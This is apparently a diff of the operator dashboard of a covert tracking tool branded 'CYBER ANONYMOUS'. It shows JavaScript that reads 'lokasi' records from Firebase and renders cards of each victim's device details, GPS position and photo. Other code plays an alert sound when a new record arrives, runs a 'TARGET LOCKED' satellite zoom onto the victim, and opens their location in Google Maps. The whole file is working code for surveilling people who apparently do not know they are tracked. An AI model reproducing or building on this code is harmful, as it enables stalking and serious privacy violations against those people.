-        ${d.baterai ? `<div class="card-row"><span class="cico">🔋</span><span class="clbl">Baterai</span><span class="cval">${d.baterai} ${d.charging === 'Mengisi' ? '⚡' : ''} ${batteryBar(d.baterai)}</span></div>` : ''}
-        ${d.platform ? `<div class="card-row"><span class="cico">💻</span><span class="clbl">Platform</span><span class="cval">${d.platform}</span></div>` : ''}
-        ${d.screen ? `<div class="card-row"><span class="cico">📱</span><span class="clbl">Layar</span><span class="cval">${d.screen}${d.pixelRatio ? ' · DPR ' + d.pixelRatio : ''}</span></div>` : ''}
-        ${d.cpu ? `<div class="card-row"><span class="cico">⚙️</span><span class="clbl">CPU</span><span class="cval">${d.cpu} core</span></div>` : ''}
-        ${d.memori ? `<div class="card-row"><span class="cico">🧠</span><span class="clbl">RAM</span><span class="cval">${d.memori} GB</span></div>` : ''}
-        ${d.network ? `<div class="card-row"><span class="cico">📶</span><span class="clbl">Jaringan</span><span class="cval">${d.network}${d.kecepatan ? ' · ' + d.kecepatan : ''}</span></div>` : ''}
-        ${d.timezone ? `<div class="card-row"><span class="cico">🕒</span><span class="clbl">Zona Waktu</span><span class="cval">${d.timezone}</span></div>` : ''}
-        ${d.sumber ? `<div class="card-row"><span class="cico">📡</span><span class="clbl">Sumber GPS</span><span class="cval">${d.sumber}${d.akurasi ? ' ±' + d.akurasi + 'm' : ''}</span></div>` : ''}
-      </div>
-
-      <div class="card-footer">
-        <span>CYBER ANONYMOUS // RORAXBRINGAZ</span>
-        <span class="scan-line">◉ SCAN COMPLETE</span>
-      </div>
-
-      <div class="card-actions">
-        <button class="btn-action btn-download" onclick="downloadCard('${key}')">📥 DOWNLOAD KARTU</button>
-        <button class="btn-action btn-delete" onclick="deleteItem('${key}')">🗑️ HAPUS</button>
-      </div>
-    </div>
-  `).join('');
-
-  const terbaru = filtered[0][1];
-  if (terbaru && terbaru.lat && document.getElementById('map')) {
-    setTimeout(() => initMapAnimation(terbaru.lat, terbaru.lng, filtered[0][0]), 200);
-  }
-}
-
-onValue(ref(db, 'lokasi/' + user), snap => {
-  const data = snap.val();
-  if (!data) {
-    allData = [];
-    lastDataCount = 0;
-    document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
-    document.getElementById('countShown').innerText = '0';
-    document.getElementById('countTotal').innerText = '0';
-    updateStats();
-    if (currentMap) { try { currentMap.remove(); } catch(e){} currentMap = null; }
-    return;
-  }
-  allData = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
-
-  if (!firstLoad && allData.length > lastDataCount) {
-    playAlertSound();
-  }
-  lastDataCount = allData.length;
-  firstLoad = false;
-
-  updateStats();
-  renderData();
-});
-
-// ============================================
-// 💬 LIVE CHAT
-// ============================================
-let chatOpen = false;
-let lastChatCount = 0;
-let chatFirstLoad = true;
-
-window.openChat = () => {
-  document.getElementById('chatPanel').classList.add('show');
-  chatOpen = true;
-  document.getElementById('chatBadge').style.display = 'none';
-  document.getElementById('btnChat').classList.remove('has-unread');
-  setTimeout(() => document.getElementById('chatInput').focus(), 300);
-  setTimeout(scrollChatBottom, 500);
-};
-
-window.closeChat = () => {
-  document.getElementById('chatPanel').classList.remove('show');
-  chatOpen = false;
-};
-
-window.sendChat = async () => {
-  const input = document.getElementById('chatInput');
-  const pesan = input.value.trim();
-  if (!pesan) return;
-
-  input.value = '';
-  document.getElementById('chatSendBtn').disabled = true;
-
-  try {
-    await push(ref(db, 'chat/global'), {
-      user: user,
-      pesan: pesan,
-      waktu: Date.now(),
-      warna: getUserColor(user)
-    });
-  } catch(e) {
-    alert('Gagal kirim: ' + e.message);
-  }
-
-  document.getElementById('chatSendBtn').disabled = false;
-  setTimeout(scrollChatBottom, 200);
-};
-
-window.deleteChatMsg = async (key) => {
-  if (!confirm('Hapus pesan ini?')) return;
-  try {
-    await remove(ref(db, 'chat/global/' + key));
-  } catch(e) {
-    alert('Gagal hapus: ' + e.message);
-  }
-};
-
-function scrollChatBottom() {
-  const container = document.getElementById('chatMessages');
-  container.scrollTop = container.scrollHeight;
-}
-
-function renderChat(snap) {
-  const data = snap.val();
-  const container = document.getElementById('chatMessages');
-
-  if (!data) {
-    container.innerHTML = '<div class="chat-empty">Belum ada pesan. Jadilah yang pertama!</div>';
-    lastChatCount = 0;
-    return;
-  }
-
-  const arr = Object.entries(data).sort((a,b) => a[1].waktu - b[1].waktu);
-
-  // Deteksi pesan baru
-  if (!chatFirstLoad && arr.length > lastChatCount && !chatOpen) {
-    document.getElementById('btnChat').classList.add('has-unread');
-    const badge = document.getElementById('chatBadge');
-    badge.innerText = arr.length - lastChatCount;
-    playBeep(900, 0.1);
-  }
-  lastChatCount = arr.length;
-  chatFirstLoad = false;
-
-  container.innerHTML = arr.map(([key, d]) => {
-    const isMine = d.user === user;
-    const color = d.warna || getUserColor(d.user);
-    const time = new Date(d.waktu).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
-    const safeText = String(d.pesan).replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    
-    return `
-      <div class="chat-msg ${isMine ? 'mine' : ''}">
-        ${isMine ? `<button class="chat-msg-delete" onclick="deleteChatMsg('${key}')" title="Hapus pesan">🗑️</button>` : ''}
-        <div class="chat-msg-header">
-          <span class="chat-msg-user" style="color: ${color};">${d.user}</span>
-          <span class="chat-msg-time">${time}</span>
-        </div>
-        <div class="chat-msg-text">${safeText}</div>
-      </div>
-    `;
-  }).join('');
-
-  if (chatOpen) scrollChatBottom();
-}
-
-onValue(ref(db, 'chat/global'), renderChat);
-
-// ===== MAP ANIMATION =====
-function initMapAnimation(lat, lng, key) {
-  if (currentMap) {
-    try { currentMap.remove(); } catch(e) {}
-    currentMap = null;
-  }
-
-  currentMap = L.map('map', {
-    zoomControl: false,
-    attributionControl: false,
-    dragging: false,
-    scrollWheelZoom: false,
-    doubleClickZoom: false,
-    boxZoom: false,
-    keyboard: false,
-    tap: false,
-    touchZoom: false
-  }).setView([0, 20], 2);
-
-  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-    maxZoom: 18
-  }).addTo(currentMap);
-
-  const zoomEl = document.getElementById('zoom-' + key);
-  const statusEl = document.querySelector('.map-status');
-  const coordsEl = document.getElementById('coords-' + key);
-
-  const stages = [
-    { zoom: 2,  center: [0, 20],     durasi: 1200, label: 'SATELIT ONLINE' },
-    { zoom: 3,  center: [10, 30],    durasi: 1000, label: 'MENCARI SINYAL...' },
-    { zoom: 5,  center: [lat, lng],  durasi: 1200, label: 'SINYAL DITEMUKAN' },
-    { zoom: 8,  center: [lat, lng],  durasi: 1000, label: 'MENGUNCI WILAYAH...' },
-    { zoom: 11, center: [lat, lng],  durasi: 1000, label: 'MEMPERBESAR...' },
-    { zoom: 14, center: [lat, lng],  durasi: 1000, label: 'HAMPIR SELESAI...' },
-    { zoom: 16, center: [lat, lng],  durasi: 1200, label: 'TARGET TERKUNCI' }
-  ];
-
-  let idx = 0;
-
-  function playStage() {
-    if (idx >= stages.length) {
-      const fotoTarget = document.querySelector('.card-photo')?.src || '';
-      const namaTarget = document.querySelector('.card-name-value')?.innerText || 'UNKNOWN';
-
-      const targetIcon = L.divIcon({
-        html: `
-          <div style="
-            width: 24px; height: 24px;
-            background: #00ff9d;
-            border-radius: 50%;
-            box-shadow: 0 0 20px #00ff9d, 0 0 40px #00ff9d, 0 0 60px #00ff9d;
-            border: 3px solid #fff;
-            animation: blink 1.2s infinite;
-          "></div>
-        `,
-        className: '',
-        iconSize: [24, 24],
-        iconAnchor: [12, 12]
-      });
-
-      currentMarker = L.marker([lat, lng], { icon: targetIcon }).addTo(currentMap);
-
-      currentMarker.bindPopup(`
-        <div style="font-family: 'Courier New', monospace; text-align: center; width: 110px;">
-          <div style="
-            background: #0a0e14; color: #00ff9d;
-            padding: 3px 5px;
-            border-radius: 3px 3px 0 0;
-            font-size: 7px; letter-spacing: 1px;
-            border: 1px solid #00ff9d; border-bottom: none;
-            text-shadow: 0 0 3px #00ff9d;
-          ">◉ TARGET LOCKED</div>
-          ${fotoTarget ? `
-            <div style="position: relative; background: #0a0e14; padding: 3px; border-left: 1px solid #00ff9d; border-right: 1px solid #00ff9d;">
-              <img src="${fotoTarget}" style="
-                width: 70px; height: 90px;
-                object-fit: cover;
-                border-radius: 3px;
-                border: 1.5px solid #00c853;
-                box-shadow: 0 0 8px #00c853;
-                display: block; margin: 0 auto;
-                filter: brightness(1.4) contrast(1.1) saturate(1.15);
-              ">
-              <div style="
-                position: absolute; top: 5px; left: 50%;
-                transform: translateX(-50%);
-                background: rgba(255,51,102,0.9);
-                color: #fff; font-size: 5px;
-                padding: 1px 4px; letter-spacing: 0.5px;
-                border-radius: 2px;
-              ">● REC</div>
-            </div>
-          ` : ''}
-          <div style="
-            background: #0a0e14; color: #00ff9d;
-            padding: 3px 5px;
-            border-radius: 0 0 3px 3px;
-            border: 1px solid #00ff9d; border-top: none;
-            font-size: 7px; letter-spacing: 0.5px;
-            text-shadow: 0 0 3px #00ff9d;
-          ">
-            <div style="font-weight: bold; margin-bottom: 1px;">${namaTarget}</div>
-            <div style="color: #7dfcce; font-size: 6px;">${lat.toFixed(3)}, ${lng.toFixed(3)}</div>
-          </div>
-        </div>
-      `, {
-        className: 'target-popup',
-        closeButton: false, autoClose: false, closeOnClick: false,
-        maxWidth: 130, autoPanPadding: [40, 40], offset: [0, -8]
-      }).openPopup();
-
-      if (statusEl) statusEl.innerText = '◉ TARGET LOCKED';
-      if (zoomEl) zoomEl.innerText = 'ZOOM: 16';
-
-      currentMap.dragging.enable();
-      currentMap.scrollWheelZoom.enable();
-      currentMap.doubleClickZoom.enable();
-      currentMap.touchZoom.enable();
-      return;
-    }
-
-    const s = stages[idx];
-    if (zoomEl) zoomEl.innerText = 'ZOOM: ' + s.zoom;
-    if (statusEl && s.label) statusEl.innerText = '◉ ' + s.label;
-    if (coordsEl) coordsEl.innerText = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
-
-    currentMap.flyTo(s.center, s.zoom, {
-      duration: s.durasi / 1000,
-      easeLinearity: 0.2,
-      noMoveStart: true
+      addLog('Records: ' + entries.length + ' | Latest: ' + new Date(latest.waktu).toLocaleTimeString('id-ID'));
     });
 
-    idx++;
-    setTimeout(playStage, s.durasi + 100);
-  }
+    // ============================================
+    // OPEN GOOGLE MAPS
+    // ============================================
+    window.bukaMaps = () => {
+      const lat = document.getElementById('infoLat').innerText;
+      const lng = document.getElementById('infoLng').innerText;
+      if (lat === '-' || lng === '-') {
+        addLog('No location data available', 'err');
+        return;
+      }
+      window.open('https://www.google.com/maps?q=' + lat + ',' + lng, '_blank');
+      addLog('Opening Google Maps...');
+    };
 
-  setTimeout(playStage, 500);
-}
-</script>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    addLog('Cyber Terminal v1.0 initialized');
+    addLog('Connected as: ' + user);
+  </script>
 </body>
 </html>
